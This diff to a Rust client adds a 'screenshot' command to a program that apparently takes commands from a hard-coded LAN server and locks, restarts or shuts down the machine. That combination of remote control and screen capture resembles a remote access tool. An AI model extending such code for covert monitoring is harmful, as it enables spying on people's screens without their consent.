@@ -7,6 +7,7 @@ use components::message;
 use components::lock;
 use components::restart;
 use components::shutdown;
+use components::screenshot;
 
 pub mod utilities;
 mod components {
@@ -14,6 +15,7 @@ mod components {
     pub mod lock;
     pub mod restart;
     pub mod shutdown;
+    pub mod screenshot;
 }
 
 const SERVER : &str = "192.168.2.220";
@@ -52,6 +54,7 @@ fn main() {
                             "lock" => lock::lock_computer(&stream),
                             "restart" => restart::restart_computer(&stream),
                             "shutdown" => shutdown::shutdown_computer(&stream),
+                            "screenshot" => screenshot::capture(&stream),
                             
                             _ => {
                                 println!("Unknown command: {}", command);
